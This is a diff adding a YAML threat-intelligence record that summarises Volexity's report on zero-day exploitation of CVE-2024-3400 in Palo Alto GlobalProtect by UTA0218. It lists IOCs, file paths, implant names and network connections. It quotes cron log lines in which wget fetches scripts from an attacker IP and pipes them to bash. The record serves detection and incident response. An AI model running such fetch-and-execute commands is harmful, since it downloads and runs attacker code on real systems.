@@ -1,0 +1,60 @@
+description: Volexity reported on the discovery of zero-day, in-the-wild exploitation
+  of CVE-2024-3400 in the GlobalProtect feature of Palo Alto Networks PAN-OS by a
+  threat actor UTA0218. The report details methods for investigating potentially compromised
+  Palo Alto Networks firewall devices.
+attribution: China-based threat actor (UTA0218)
+malware_families:
+- vpn_prot
+- lowdp
+authors:
+- Volexity Threat Research
+TTPs:
+  processes:
+  - crond
+  - wget
+  - sshd
+  - panlogs
+  - device_telemetry
+  - vpn_prot
+  - lowdp
+  commandline:
+  - 'crond[18423]: (root) CMD (wget -qO- http://172.233.228.93/f | bash)'
+  - 'crond[25961]: (root) CMD (wget -qO- http://172.233.228.93/policy | bash)'
+  - 'crond[26478]: (root) CMD (wget -qO- http://172.233.228.93/policy | bash)'
+  - sshd -D
+  - vpn_prot -L=socks
+  - lowdp -p 31289
+  powershell: ''
+  scripting_engine: ''
+  registry_keys: ''
+  image_load: ''
+  network_connections:
+  - executable: vpn_prot
+    destination_address: 172.233.228.93
+    port: 8443
+  - executable: lowdp
+    destination_address: 172.233.228.93
+    port: 80
+  - executable: wget
+    destination_address: 172.233.228.93
+  file_activity:
+  - /var/log/pan/gpsvc.log
+  - /var/log/pan/md_out.log
+  - /var/log/pan/device_telemetry_send.log
+  - /var/log/syslog-system.log
+  - /var/log/pan/mp-monitor.log
+  - /tmp/vpn_prot
+  - /tmp/lowdp
+  - /opt/panlogs/tmp/device_telemetry/minute/*
+  - /opt/panrepo/
+  - /opt/plugins/
+  persistence:
+  - cron.d script for persistence and downloading of additional payloads via wget
+  pipes: ''
+  process_relations: ''
+IOCs:
+- 172.233.228.93
+- CVE-2024-3400
+reference: https://www.volexity.com/blog/2024/05/15/detecting-compromise-of-cve-2024-3400-on-palo-alto-networks-globalprotect-devices/
+date_of_publication: May 15, 2024
+file_creation_date: June 13, 2025
